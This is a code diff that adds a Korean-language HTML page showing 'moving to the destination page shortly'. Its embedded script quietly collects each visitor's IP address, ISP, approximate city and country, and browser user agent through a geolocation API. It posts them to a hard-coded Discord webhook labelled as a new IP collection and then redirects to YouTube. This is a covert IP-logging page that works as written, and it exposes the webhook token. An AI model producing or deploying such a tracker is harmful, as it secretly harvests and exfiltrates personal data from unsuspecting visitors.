@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>페이지 이동 중</title>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 45vh; font-family: sans-serif;">
+        <h2>잠시 후 목적지 페이지로 이동합니다...</h2>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1546103958668316683/84gcHSczGYqjIs_py8BrDL0wuPVefbvwqebj4yKwCfIUXWlHWWdkuLkbP69UwQnEUU3H';
+        const REDIRECT_URL = 'https://youtube.com'; 
+
+        fetch('https://ipapi.co/json/')
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                const discordMessage = {
+                    embeds: [{
+                        title: "🚨 새로운 IP 수집 완료",
+                        color: 15158332,
+                        fields: [
+                            { name: "🕒 접속 시간", value: new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' }), inline: false },
+                            { name: "🌐 IP 주소", value: "`" + (data.ip || "확인 불가") + "`", inline: true },
+                            { name: "🏢 인터넷 통신사(ISP)", value: data.org || "확인 불가", inline: true },
+                            { name: "📍 대략적 위치", value: (data.country_name || "확인 불가") + ", " + (data.city || "확인 불가"), inline: false },
+                            { name: "📱 기기 정보", value: "```" + navigator.userAgent + "```", inline: false }
+                        ]
+                    }]
+                };
+
+                return fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordMessage)
+                });
+            })
+            .then(function() { window.location.href = REDIRECT_URL; })
+            .catch(function() { window.location.href = REDIRECT_URL; });
+    </script>
+</body>
+</html>
